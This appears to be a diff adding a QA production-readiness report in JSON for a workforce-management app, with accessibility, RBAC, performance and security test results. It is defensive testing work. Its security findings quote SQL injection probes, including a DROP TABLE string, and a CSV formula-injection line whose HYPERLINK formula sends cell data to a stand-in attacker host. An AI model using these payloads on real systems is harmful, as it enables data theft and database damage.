@@ -1,0 +1,3136 @@
+{
+ "generatedAt": "2026-10-31T13:35:42.589Z",
+ "environment": {
+  "admin": "http://localhost:3000 (Vite dev)",
+  "portal": "http://localhost:3001 (Vite dev)",
+  "gateway": "http://localhost:4000",
+  "engine": "127.0.0.1:50051",
+  "db": "PostgreSQL 5432 (schema wfm, RLS on)",
+  "other": "Redis 6379, NATS JetStream",
+  "branch": "qa/production-readiness (from main @ 6820caf, with uncommitted engine/gateway changes in the working tree)",
+  "browser": "Google Chrome (installed) via Playwright 1.64.1"
+ },
+ "verdict": "NO-GO",
+ "bySev": {
+  "Critical": 2,
+  "High": 6,
+  "Medium": 11,
+  "Low": 8,
+  "Info": 1
+ },
+ "counts": {
+  "adminScreens": 51,
+  "portalSections": 5,
+  "routes": 352,
+  "guardedRoutes": 327,
+  "rbacChecks": 1934,
+  "functionalChecks": 99,
+  "functionalPass": 94,
+  "uiChecks": 34,
+  "uiPass": 27,
+  "securityTests": 16,
+  "securityPass": 10,
+  "playwright": null
+ },
+ "modules": [
+  {
+   "id": "overview",
+   "name": "Overview",
+   "screens": 1,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 2683,
+   "maxLoad": {
+    "at": "2026-10-31T13:23:11.582Z",
+    "module": "overview",
+    "sub": "",
+    "url": "/overview",
+    "urlNow": "/overview",
+    "heading": "Overview",
+    "loadMs": 2683,
+    "settleMs": 935,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 2,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     },
+     {
+      "id": "definition-list",
+      "impact": "serious",
+      "nodes": 1,
+      "help": "<dl> elements must only directly contain properly-ordered <dt> and <dd> groups, <script>, <template> or <div> elements"
+     },
+     {
+      "id": "dlitem",
+      "impact": "serious",
+      "nodes": 10,
+      "help": "<dt> and <dd> elements must be contained by a <dl>"
+     }
+    ],
+    "shot": "overview.png"
+   },
+   "fnPass": 0,
+   "fnTotal": 0,
+   "defects": [],
+   "worst": null
+  },
+  {
+   "id": "workforce",
+   "name": "Workforce",
+   "screens": 7,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 2907,
+   "maxLoad": {
+    "at": "2026-10-31T13:24:15.355Z",
+    "module": "workforce",
+    "sub": "attendance",
+    "url": "/workforce/attendance",
+    "urlNow": "/workforce/attendance",
+    "heading": "Time & Attendance",
+    "loadMs": 4079,
+    "settleMs": 2245,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)",
+     "****************************************************************************************************************************",
+     "************************************************ AG Grid Enterprise License ************************************************",
+     "************************************************** License Key Not Found ***************************************************",
+     "* All AG Grid Enterprise features are unlocked for trial.                                                                  *",
+     "* If you want to hide the watermark please email info@ag-grid.com for a trial license key.                                 *"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 13,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "workforce-attendance.png"
+   },
+   "fnPass": 17,
+   "fnTotal": 19,
+   "defects": [
+    "DEF-02",
+    "DEF-23"
+   ],
+   "worst": "High"
+  },
+  {
+   "id": "forecasting",
+   "name": "Forecasting",
+   "screens": 8,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 3458,
+   "maxLoad": {
+    "at": "2026-10-31T13:27:16.474Z",
+    "module": "forecasting",
+    "sub": "accuracy-heatmap",
+    "url": "/forecasting/accuracy-heatmap",
+    "urlNow": "/forecasting/accuracy-heatmap",
+    "heading": "Accuracy",
+    "loadMs": 5502,
+    "settleMs": 3632,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 114,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "forecasting-accuracy-heatmap.png"
+   },
+   "fnPass": 12,
+   "fnTotal": 12,
+   "defects": [
+    "DEF-13"
+   ],
+   "worst": "Medium"
+  },
+  {
+   "id": "scheduling",
+   "name": "Scheduling",
+   "screens": 14,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 3182,
+   "maxLoad": {
+    "at": "2026-10-31T13:28:37.430Z",
+    "module": "scheduling",
+    "sub": "multi-site",
+    "url": "/scheduling/multi-site",
+    "urlNow": "/scheduling/multi-site",
+    "heading": "Multi-Site View",
+    "loadMs": 7706,
+    "settleMs": 5744,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 25,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "scheduling-multi-site.png"
+   },
+   "fnPass": 14,
+   "fnTotal": 14,
+   "defects": [
+    "DEF-14"
+   ],
+   "worst": "Critical"
+  },
+  {
+   "id": "intraday",
+   "name": "Intraday & RTA",
+   "screens": 4,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 2291,
+   "maxLoad": {
+    "at": "2026-10-31T13:29:42.566Z",
+    "module": "intraday",
+    "sub": "adherence",
+    "url": "/intraday/adherence",
+    "urlNow": "/intraday/adherence",
+    "heading": "Real-Time Adherence",
+    "loadMs": 2386,
+    "settleMs": 615,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 4,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "intraday-adherence.png"
+   },
+   "fnPass": 6,
+   "fnTotal": 6,
+   "defects": [],
+   "worst": null
+  },
+  {
+   "id": "configuration",
+   "name": "Configuration",
+   "screens": 9,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 2877,
+   "maxLoad": {
+    "at": "2026-10-31T13:30:39.211Z",
+    "module": "configuration",
+    "sub": "sites-skills",
+    "url": "/configuration/sites-skills",
+    "urlNow": "/configuration/sites-skills",
+    "heading": "Configuration & Optimization Policy",
+    "loadMs": 5782,
+    "settleMs": 3625,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 2,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "configuration-sites-skills.png"
+   },
+   "fnPass": 14,
+   "fnTotal": 14,
+   "defects": [
+    "DEF-03",
+    "DEF-07",
+    "DEF-19"
+   ],
+   "worst": "High"
+  },
+  {
+   "id": "data-management",
+   "name": "Data management",
+   "screens": 3,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 3263,
+   "maxLoad": {
+    "at": "2026-10-31T13:31:34.048Z",
+    "module": "data-management",
+    "sub": "data-quality",
+    "url": "/data-management/data-quality",
+    "urlNow": "/data-management/data-quality",
+    "heading": "Data Quality",
+    "loadMs": 4076,
+    "settleMs": 2395,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 2,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "data-management-data-quality.png"
+   },
+   "fnPass": 8,
+   "fnTotal": 8,
+   "defects": [
+    "DEF-28"
+   ],
+   "worst": "Info"
+  },
+  {
+   "id": "audit",
+   "name": "Audit",
+   "screens": 1,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 2914,
+   "maxLoad": {
+    "at": "2026-10-31T13:31:50.416Z",
+    "module": "audit",
+    "sub": "",
+    "url": "/audit",
+    "urlNow": "/audit",
+    "heading": "Audit Log",
+    "loadMs": 2914,
+    "settleMs": 1214,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 7,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 94,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "audit.png"
+   },
+   "fnPass": 2,
+   "fnTotal": 3,
+   "defects": [
+    "DEF-08",
+    "DEF-12"
+   ],
+   "worst": "Medium"
+  },
+  {
+   "id": "administration",
+   "name": "Administration",
+   "screens": 4,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 2801,
+   "maxLoad": {
+    "at": "2026-10-31T13:32:07.403Z",
+    "module": "administration",
+    "sub": "roles",
+    "url": "/administration/roles",
+    "urlNow": "/administration/roles",
+    "heading": "Users & roles",
+    "loadMs": 3284,
+    "settleMs": 1087,
+    "crashed": false,
+    "crashMsg": "",
+    "gatewayDown": false,
+    "onLogin": false,
+    "consoleErrors": [
+     "Failed to load resource: the server responded with a status of 404 (Not Found)"
+    ],
+    "pageErrors": [],
+    "failed": [],
+    "slow": [],
+    "visibleErrors": [],
+    "unrendered": [],
+    "axe": [
+     {
+      "id": "button-name",
+      "impact": "critical",
+      "nodes": 180,
+      "help": "Buttons must have discernible text"
+     },
+     {
+      "id": "color-contrast",
+      "impact": "serious",
+      "nodes": 2,
+      "help": "Elements must meet minimum color contrast ratio thresholds"
+     }
+    ],
+    "shot": "administration-roles.png"
+   },
+   "fnPass": 3,
+   "fnTotal": 4,
+   "defects": [
+    "DEF-01",
+    "DEF-04",
+    "DEF-09",
+    "DEF-10",
+    "DEF-25"
+   ],
+   "worst": "Critical"
+  },
+  {
+   "id": "portal",
+   "name": "Employee portal",
+   "screens": 5,
+   "crashes": 0,
+   "serverErrors": 0,
+   "avgLoadMs": 793,
+   "fnPass": 37,
+   "fnTotal": 41,
+   "defects": [
+    "DEF-17",
+    "DEF-20",
+    "DEF-21",
+    "DEF-22"
+   ],
+   "worst": "Medium"
+  }
+ ],
+ "security": [
+  {
+   "at": "2026-10-31T13:26:12.558Z",
+   "id": "SEC-01",
+   "severity": "High",
+   "title": "Administrator signs in with a password on the app's own blocklist, and is not forced to change it",
+   "evidence": {
+    "mustChangePassword": false,
+    "containsUsername": true
+   },
+   "pass": false
+  },
+  {
+   "at": "2026-10-31T13:26:16.914Z",
+   "id": "SEC-02",
+   "severity": "Info",
+   "title": "Password policy enforced on change",
+   "evidence": [
+    "short1! -> 400 Use at least 8 characters.",
+    "password123 -> 400 That password is too easy to guess. Avoid common words and number runs.",
+    "demo.agent1-xyz9 -> 400 The password cannot contain your username.",
+    "abcdefghij -> 400 That password is too easy to guess. Avoid common words and number runs.",
+    "11111111aa -> 400 Use a wider mix of characters.",
+    "<same> -> 400 Choose a password different from your current one."
+   ],
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:17.389Z",
+   "id": "SEC-03",
+   "severity": "Info",
+   "title": "JWT forgery (alg:none, role swap, bad signature, expired) rejected",
+   "evidence": {
+    "algNone": 401,
+    "roleSwap": 401,
+    "badSig": 401,
+    "expired": 401,
+    "garbage": 401
+   },
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:17.843Z",
+   "id": "SEC-04",
+   "severity": "Info",
+   "title": "Token revoked after logout",
+   "evidence": {
+    "after": 401
+   },
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:17.864Z",
+   "id": "SEC-05",
+   "severity": "Medium",
+   "title": "Bearer token accepted as ?token= on every REST route (and used for /ws); leaks into logs, history, Referer",
+   "evidence": {
+    "status": 200
+   },
+   "pass": false
+  },
+  {
+   "at": "2026-10-31T13:26:19.590Z",
+   "id": "SEC-06",
+   "severity": "Info",
+   "title": "Login throttled after 10 failures (per IP + username, 15 min)",
+   "evidence": {
+    "codes": [
+     401,
+     401,
+     401,
+     401,
+     401,
+     401,
+     401,
+     401,
+     401,
+     401,
+     429,
+     429
+    ]
+   },
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:22.121Z",
+   "id": "SEC-07",
+   "severity": "Medium",
+   "title": "Login response time reveals whether a username exists (bcrypt only runs for real users)",
+   "evidence": {
+    "knownMedianMs": 409,
+    "unknownMedianMs": 6
+   },
+   "pass": false
+  },
+  {
+   "at": "2026-10-31T13:26:24.321Z",
+   "id": "SEC-08",
+   "severity": "Low",
+   "title": "Unauthenticated /auth/discover and /auth/login-options reveal account existence and organisation name",
+   "evidence": {
+    "discoverHit": {
+     "organisations": [
+      {
+       "code": "ORG",
+       "name": "My Organisation"
+      }
+     ]
+    },
+    "discoverMiss": {
+     "organisations": []
+    },
+    "loginOptions": {
+     "singleOrganisation": {
+      "code": "ORG",
+      "name": "My Organisation"
+     },
+     "discovery": true
+    }
+   },
+   "pass": false
+  },
+  {
+   "at": "2026-10-31T13:26:24.342Z",
+   "id": "SEC-09",
+   "severity": "Info",
+   "title": "Gateway security headers (helmet)",
+   "evidence": {
+    "content-security-policy": "default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests",
+    "strict-transport-security": "max-age=31536000; includeSubDomains",
+    "x-frame-options": "SAMEORIGIN",
+    "x-content-type-options": "nosniff",
+    "referrer-policy": "no-referrer",
+    "x-powered-by": null,
+    "cross-origin-opener-policy": "same-origin"
+   },
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:24.367Z",
+   "id": "SEC-10",
+   "severity": "Info",
+   "title": "CORS allow-list (only the admin origin; the portal goes through its Vite proxy)",
+   "evidence": {
+    "evilACAO": null,
+    "portalACAO": null
+   },
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:24.557Z",
+   "id": "SEC-11",
+   "severity": "Info",
+   "title": "SQL injection probes (login, search, ids) handled without 5xx",
+   "evidence": [
+    "login ' OR '1'='1 -> 401",
+    "/workforce/employees?q='%20OR%20'1'%3D'1 -> 200",
+    "/audit?search='%20OR%20'1'%3D'1 -> 200",
+    "/auth/org/'%20OR%20'1'%3D'1 -> 404",
+    "/scheduling/versions/'%20OR%20'1'%3D'1 -> 400",
+    "login '; DROP TABLE users;-- -> 401",
+    "/workforce/employees?q='%3B%20DROP%20TAB -> 200",
+    "/audit?search='%3B%20DROP%20TABLE%20user -> 200",
+    "/auth/org/'%3B%20DROP%20TABLE%20users%3B -> 404",
+    "/scheduling/versions/'%3B%20DROP%20TABLE -> 400",
+    "login 1) OR (1=1 -> 401",
+    "/workforce/employees?q=1)%20OR%20(1%3D1 -> 200",
+    "/audit?search=1)%20OR%20(1%3D1 -> 200",
+    "/auth/org/1)%20OR%20(1%3D1 -> 404",
+    "/scheduling/versions/1)%20OR%20(1%3D1 -> 400",
+    "login \\ -> 401",
+    "/workforce/employees?q=%5C -> 200",
+    "/audit?search=%5C -> 200",
+    "/auth/org/%5C -> 404",
+    "/scheduling/versions/%5C -> 400",
+    "login admin'-- -> 401",
+    "/workforce/employees?q=admin'-- -> 200",
+    "/audit?search=admin'-- -> 200",
+    "/auth/org/admin'-- -> 404",
+    "/scheduling/versions/admin'-- -> 400"
+   ],
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:24.677Z",
+   "id": "SEC-12",
+   "severity": "Info",
+   "title": "Malformed JSON / 15MB body / 5000-char name",
+   "evidence": {
+    "malformed": 400,
+    "malformedBody": "INTERNAL",
+    "over14mb": 413,
+    "team5000chars": 400,
+    "team5000msg": "Invalid input: name String must contain at most 80 character(s)"
+   },
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:24.841Z",
+   "id": "SEC-13",
+   "severity": "Info",
+   "title": "Cross-agent access to time-off/swaps",
+   "evidence": {
+    "agent2Schedule": "object",
+    "agent2Swaps": 200,
+    "createTimeOff": "201 ",
+    "agent1 cancels agent2 request": 404,
+    "agent2 request visible to agent1": false,
+    "agent2 cancels own": 200,
+    "agent2 gives away agent1 shift": "400 That is not your shift.",
+    "otherSwapsVisible": 200
+   },
+   "pass": true
+  },
+  {
+   "at": "2026-10-31T13:26:24.921Z",
+   "id": "SEC-14",
+   "severity": "Medium",
+   "title": "Audit CSV export writes user-entered names that start with = unescaped (formula injection when opened in Excel)",
+   "evidence": {
+    "teamCreate": 201,
+    "csvLine": "1554,2026-10-31T13:26:24.866Z,Administrator,WFM_ADMIN,CREATE,TEAM,f885eb0b-cb60-4d3d-aa6e-094bb7b6c2b3,\"=HYPERLINK(\"\"http://evil.example/?x=\"\"&A1,\"\"QA182778\"\")\",,,API,::1,bcc502c8-d599-4dcd-9b28-09008"
+   },
+   "pass": false
+  },
+  {
+   "at": "2026-10-31T13:26:27.583Z",
+   "id": "SEC-15",
+   "severity": "Medium",
+   "title": "Impossible calendar date (2026-02-30) returns 500 and leaks the raw PostgreSQL error",
+   "evidence": {
+    "out": {
+     "reversed": "400 The end date is before the start date.",
+     "tenYears": "400 Ask for at most 90 days at a time.",
+     "past": "400 That date has already passed. Only sick leave can be recorded after the fact.",
+     "badDay": "500 date/time field value out of range: \"2026-02-30\"",
+     "massAssign": "201 APPROVED"
+    },
+    "accepted": [],
+    "crashed": [
+     "badDay"
+    ]
+   },
+   "pass": false
+  },
+  {
+   "at": "2026-10-31T13:26:29.831Z",
+   "id": "SEC-16",
+   "severity": "Info",
+   "title": "Error responses do not leak stack/SQL",
+   "evidence": {
+    "status": 400,
+    "body": "{\"error\":{\"code\":\"VALIDATION\",\"message\":\"Invalid input: body Invalid uuid\",\"details\":[{\"field\":\"\",\"message\":\"Invalid uuid\"}],\"requestId\":\"896598cc-ba6b-4965-be82-dd7a555e2e64\"}}"
+   },
+   "pass": true
+  }
+ ],
+ "rbac": [
+  {
+   "at": "2026-10-31T13:26:34.134Z",
+   "check": "unauthenticated",
+   "tested": 327,
+   "leaks": []
+  },
+  {
+   "at": "2026-10-31T13:26:36.826Z",
+   "check": "role",
+   "role": "WFM_MANAGER",
+   "tested": 168,
+   "leaks": [],
+   "wrongDeny": [],
+   "errors5xx": []
+  },
+  {
+   "at": "2026-10-31T13:26:39.689Z",
+   "check": "role",
+   "role": "FORECAST_PLANNER",
+   "tested": 282,
+   "leaks": [],
+   "wrongDeny": [],
+   "errors5xx": []
+  },
+  {
+   "at": "2026-10-31T13:26:43.457Z",
+   "check": "role",
+   "role": "SCHEDULER",
+   "tested": 250,
+   "leaks": [],
+   "wrongDeny": [],
+   "errors5xx": []
+  },
+  {
+   "at": "2026-10-31T13:26:47.562Z",
+   "check": "role",
+   "role": "SUPERVISOR_RTA",
+   "tested": 297,
+   "leaks": [],
+   "wrongDeny": [],
+   "errors5xx": []
+  },
+  {
+   "at": "2026-10-31T13:26:54.822Z",
+   "check": "role",
+   "role": "ANALYST",
+   "tested": 300,
+   "leaks": [],
+   "wrongDeny": [],
+   "errors5xx": []
+  },
+  {
+   "at": "2026-10-31T13:26:57.074Z",
+   "check": "role",
+   "role": "AGENT",
+   "tested": 310,
+   "leaks": [],
+   "wrongDeny": [],
+   "errors5xx": []
+  },
+  {
+   "at": "2026-10-31T13:26:57.352Z",
+   "check": "idor",
+   "run": "190471",
+   "out": [
+    "/me/schedule?employeeId=42f43ace-bde4-420f-92ea-a633d2eeec89 -> 400",
+    "/me/profile?employeeId=42f43ace-bde4-420f-92ea-a633d2eeec89 -> 400",
+    "/me/time-off?employeeId=42f43ace-bde4-420f-92ea-a633d2eeec89 -> 400",
+    "/workforce/employees/42f43ace-bde4-420f-92ea-a633d2eeec89 -> 403"
+   ]
+  }
+ ],
+ "axe": [
+  {
+   "id": "button-name",
+   "impact": "critical",
+   "help": "Buttons must have discernible text",
+   "screens": 51,
+   "nodes": 530
+  },
+  {
+   "id": "label",
+   "impact": "critical",
+   "help": "Form elements must have labels",
+   "screens": 1,
+   "nodes": 12
+  },
+  {
+   "id": "select-name",
+   "impact": "critical",
+   "help": "Select element must have an accessible name",
+   "screens": 1,
+   "nodes": 1
+  },
+  {
+   "id": "color-contrast",
+   "impact": "serious",
+   "help": "Elements must meet minimum color contrast ratio thresholds",
+   "screens": 51,
+   "nodes": 822
+  },
+  {
+   "id": "dlitem",
+   "impact": "serious",
+   "help": "<dt> and <dd> elements must be contained by a <dl>",
+   "screens": 1,
+   "nodes": 10
+  },
+  {
+   "id": "definition-list",
+   "impact": "serious",
+   "help": "<dl> elements must only directly contain properly-ordered <dt> and <dd> groups, <script>, <template> or <div> elements",
+   "screens": 1,
+   "nodes": 1
+  }
+ ],
+ "perf": [
+  {
+   "at": "2026-10-31T13:06:50.305Z",
+   "kind": "api-latency",
+   "rows": [
+    {
+     "endpoint": "/auth/me",
+     "status": 200,
+     "p50": 4,
+     "p95": 5,
+     "max": 5,
+     "kb": 1
+    },
+    {
+     "endpoint": "/config/groups",
+     "status": 200,
+     "p50": 4,
+     "p95": 5,
+     "max": 5,
+     "kb": 4
+    },
+    {
+     "endpoint": "/workforce/employees",
+     "status": 200,
+     "p50": 42,
+     "p95": 55,
+     "max": 55,
+     "kb": 328
+    },
+    {
+     "endpoint": "/scheduling/versions",
+     "status": 200,
+     "p50": 7,
+     "p95": 11,
+     "max": 11,
+     "kb": 43
+    },
+    {
+     "endpoint": "/scheduling/versions/:id/shifts",
+     "status": 200,
+     "p50": 16,
+     "p95": 19,
+     "max": 19,
+     "kb": 169
+    },
+    {
+     "endpoint": "/forecast/versions",
+     "status": 200,
+     "p50": 4,
+     "p95": 5,
+     "max": 5,
+     "kb": 6
+    },
+    {
+     "endpoint": "/intraday/coverage?groupId=:group",
+     "status": 200,
+     "p50": 37,
+     "p95": 43,
+     "max": 43,
+     "kb": 25
+    },
+    {
+     "endpoint": "/intraday/adherence?groupId=:group",
+     "status": 200,
+     "p50": 11,
+     "p95": 23,
+     "max": 23,
+     "kb": 6
+    },
+    {
+     "endpoint": "/audit",
+     "status": 200,
+     "p50": 6,
+     "p95": 9,
+     "max": 9,
+     "kb": 53
+    },
+    {
+     "endpoint": "/me/home",
+     "status": 200,
+     "p50": 10,
+     "p95": 20,
+     "max": 20,
+     "kb": 1
+    },
+    {
+     "endpoint": "/me/schedule",
+     "status": 200,
+     "p50": 8,
+     "p95": 11,
+     "max": 11,
+     "kb": 8
+    },
+    {
+     "endpoint": "/me/time-off",
+     "status": 200,
+     "p50": 6,
+     "p95": 9,
+     "max": 9,
+     "kb": 3
+    }
+   ]
+  },
+  {
+   "at": "2026-10-31T13:06:57.518Z",
+   "kind": "concurrency",
+   "rows": [
+    {
+     "endpoint": "/workforce/employees",
+     "requests": 100,
+     "rps": 40,
+     "p50": 538,
+     "p95": 627,
+     "max": 651,
+     "codes": {
+      "200": 100
+     }
+    },
+    {
+     "endpoint": "/config/groups",
+     "requests": 100,
+     "rps": 501,
+     "p50": 37,
+     "p95": 49,
+     "max": 52,
+     "codes": {
+      "200": 100
+     }
+    },
+    {
+     "endpoint": "/scheduling/versions",
+     "requests": 100,
+     "rps": 326,
+     "p50": 55,
+     "p95": 76,
+     "max": 81,
+     "codes": {
+      "200": 100
+     }
+    },
+    {
+     "endpoint": "POST /auth/login x10 concurrent",
+     "requests": 10,
+     "wallMs": 4181,
+     "p95": 4179,
+     "codes": {
+      "200": 10
+     }
+    }
+   ]
+  },
+  {
+   "at": "2026-10-31T13:07:44.766Z",
+   "kind": "page-load",
+   "rows": [
+    {
+     "url": "/overview",
+     "loadMs": 1489,
+     "settledMs": 2305,
+     "apiCalls": 15,
+     "domContentLoaded": 1095,
+     "transferKb": 15350,
+     "resources": 127
+    },
+    {
+     "url": "/workforce/employees",
+     "loadMs": 869,
+     "settledMs": 1480,
+     "apiCalls": 18,
+     "domContentLoaded": 285,
+     "transferKb": 370,
+     "resources": 129
+    },
+    {
+     "url": "/forecasting/forecast-dashboard",
+     "loadMs": 835,
+     "settledMs": 1613,
+     "apiCalls": 11,
+     "domContentLoaded": 398,
+     "transferKb": 46,
+     "resources": 122
+    },
+    {
+     "url": "/forecasting/forecast-builder",
+     "loadMs": 637,
+     "settledMs": 34064,
+     "apiCalls": 20,
+     "domContentLoaded": 538,
+     "transferKb": 48,
+     "resources": 132
+    },
+    {
+     "url": "/scheduling/schedule-timeline",
+     "loadMs": 660,
+     "settledMs": 1993,
+     "apiCalls": 22,
+     "domContentLoaded": 336,
+     "transferKb": 249,
+     "resources": 133
+    },
+    {
+     "url": "/intraday/live-coverage",
+     "loadMs": 594,
+     "settledMs": 1212,
+     "apiCalls": 10,
+     "domContentLoaded": 317,
+     "transferKb": 32,
+     "resources": 121
+    },
+    {
+     "url": "/forecasting/accuracy-heatmap",
+     "loadMs": 452,
+     "settledMs": 3350,
+     "apiCalls": 12,
+     "domContentLoaded": 225,
+     "transferKb": 55,
+     "resources": 123
+    }
+   ],
+   "note": "Vite dev server (unbundled ES modules) — production build will load far fewer resources"
+  }
+ ],
+ "responsive": [
+  {
+   "at": "2026-10-31T13:06:31.597Z",
+   "app": "portal",
+   "ok": false,
+   "detail": {
+    "login": {
+     "docW": 412,
+     "viewW": 412,
+     "mainW": 0,
+     "asideW": 0
+    },
+    "Home": {
+     "docW": 412,
+     "viewW": 412,
+     "mainW": 188,
+     "asideW": 224
+    },
+    "Schedule": {
+     "docW": 443,
+     "viewW": 443,
+     "mainW": 188,
+     "asideW": 224
+    },
+    "Requests": {
+     "docW": 412,
+     "viewW": 412,
+     "mainW": 188,
+     "asideW": 224
+    }
+   },
+   "note": "sidebar is a fixed 224px column (w-56) with no mobile layout"
+  },
+  {
+   "at": "2026-10-31T13:06:45.851Z",
+   "app": "admin",
+   "ok": true,
+   "detail": {
+    "/overview": {
+     "docW": 491,
+     "viewW": 491,
+     "mainW": 172,
+     "asideW": 240
+    },
+    "/workforce/employees": {
+     "docW": 491,
+     "viewW": 491,
+     "mainW": 172,
+     "asideW": 240
+    },
+    "/scheduling/schedule-timeline": {
+     "docW": 491,
+     "viewW": 491,
+     "mainW": 172,
+     "asideW": 240
+    }
+   }
+  }
+ ],
+ "staticChecks": [
+  {
+   "name": "TypeScript — admin web app",
+   "ok": true,
+   "detail": "0 errors"
+  },
+  {
+   "name": "TypeScript — employee portal",
+   "ok": true,
+   "detail": "0 errors"
+  },
+  {
+   "name": "TypeScript — gateway",
+   "ok": true,
+   "detail": "0 errors"
+  },
+  {
+   "name": "Production build — admin",
+   "ok": true,
+   "detail": "4,233.76 kB / gzip 1,180.34 kB (one chunk)"
+  },
+  {
+   "name": "Production build — portal",
+   "ok": true,
+   "detail": "281.29 kB / gzip 85.22 kB"
+  },
+  {
+   "name": "Secrets scan of both bundles",
+   "ok": true,
+   "detail": "No keys, connection strings or passwords; JWT_SECRET appears only as help text"
+  },
+  {
+   "name": "Engine unit tests (pytest)",
+   "ok": true,
+   "detail": "91 passed in 4 min"
+  },
+  {
+   "name": "Gateway's own API suite (75 files)",
+   "ok": false,
+   "detail": "580/683 passed, 77 failed, 20 cancelled · 6 min. Not a clean signal: it shares the dev database and gateway (its README asks for an empty database on :4001 with FORCE_PASSWORD_CHANGE=false); failures are mostly test users stopped by the forced password change, the engine crash (DEF-14), and knock-on failures. Re-run it in CI on an empty database before release."
+  }
+ ],
+ "gatewaySuite": {
